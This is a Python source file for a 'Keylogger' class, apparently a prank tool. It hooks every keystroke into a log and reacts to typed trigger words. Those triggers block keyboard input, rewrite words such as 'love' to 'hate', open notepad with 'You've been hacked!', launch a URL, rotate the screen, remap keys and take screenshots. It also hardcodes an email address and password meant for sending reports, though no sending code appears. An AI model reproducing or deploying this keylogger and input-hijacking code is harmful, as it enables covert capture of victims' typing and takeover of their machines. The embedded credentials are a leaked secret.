import keyboard
import mouse
import smtplib
import pyautogui
import rotatescreen

from threading import Timer
from datetime import datetime
from time import sleep


SEND_REPORT_INTERVAL = 5
EMAIL = "keyloggerlogs145@gmail.com"
PASSWORD = "keylogger123"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    keys = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', \
    'z', 'x', 'c', 'v', 'b', 'n', 'm', 'enter', 'space', 'control', 'shift', 'tab', 'esc', 'alt', 'win', 'backspace', \
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '[', ']', ';', '\'', ',', '.', '/', '\\', '`']

    autocorrect_words = {
        ' ' : 'SPACE',
        'thank' : 'screw',
        'love' : 'hate',

    }

    def start(self):
        # Start keyloggerbasicbasicbasic
        keyboard.on_release(callback=self.callback)
        # Block the current thread, wait until CTRL+C is pressed test
        keyboard.wait() 

    # Log key when pressed
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # Not a character, special key (e.g ctrl, alt, etc.)
            # Uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # Add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            elif name == 'backspace':
                name = ""
                self.log = self.log[:-1]
            else:
                # Replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        # Finally, add the key name to our global `self.log` variable
        self.log += name
        self.check_commands(self.log.lower())

    # Find and run commands from the keyboard input
    def check_commands(self, string):
        self.autocorrect(string)
        if string.find("test") != -1:
            self.simple_test()
        elif string.find("pause") != -1:
            self.pause_keyboard(2)
        elif string.find("url") != -1:
            self.go_to_url()
        elif string.find("rotate") != -1:
            self.rotate_screen()
        elif string.find("remap") != -1:
            self.temp_remap_keys()
        elif string.find("screenshot") != -1:
            self.screenshot()
        elif string.find("minimise") != -1:
            self.minimise()
        elif string.find("$pleasedon'ttypeanotherdollarsign$") != -1:
            self.armageddon()


    # Block all inputs from the keyboard
    def block_keys(self):
        for key in self.keys:
            keyboard.block_key(key)

    # Unblock all input from the keyboard
    def unblock_keys(self):
        for key in self.keys:
            keyboard.unhook(key)

    # Simple test to check if the program works
    def simple_test(self):
        self.block_keys()
        pyautogui.hotkey("winleft", "m")
        pyautogui.press("winleft")
        pyautogui.write("notepad")
        pyautogui.press("enter")
        sleep(0.5)
        pyautogui.write("You've been hacked!")
        self.unblock_keys()
        self.log = ""

    # Blocks all inputs from the keyboard for len seconds then unblocks them
    def pause_keyboard(self, len):
        self.block_keys()
        sleep(len)
        self.unblock_keys()
        self.log = ""

    def autocorrect(self, string):
        for word in self.autocorrect_words.keys():
            if string.find(word) != -1:
                print(len(word))
                for i in range(len(word)):
                    keyboard.press('backspace')
                    sleep(0.001)
                keyboard.write(self.autocorrect_words[word])
                self.log = ""
    
    def go_to_url(self):
        pyautogui.hotkey("winleft", "r")
        pyautogui.write("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        pyautogui.press("enter")
        self.log = ""

    def rotate_screen(self):
        screen = rotatescreen.get_primary_display()
        start_pos = screen.current_orientation
        new_pos = abs((start_pos - 90) % 360)
        screen.rotate_to(new_pos)
        self.log = ""

    def remap_keys(self):
        for i in range(int(len(self.keys)/2)):
            keyboard.remap_key(self.keys[0+i],self.keys[0-i])
    
    def unremap_keys(self):
        for key in self.keys:
            keyboard.unremap_key(key)

    def temp_remap_keys(self):
        self.remap_keys()
        sleep(2)
        self.unremap_keys()

    def screenshot(self):
        img = pyautogui.screenshot()
        self.log = ""
    
    def minimise(self):
        for i in range(20):
            pyautogui.hotkey("winleft", "m")
            sleep(0.1)
        self.log = ""
    
    def armageddon(self):
        self.log = ""

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_INTERVAL)
    keylogger.start()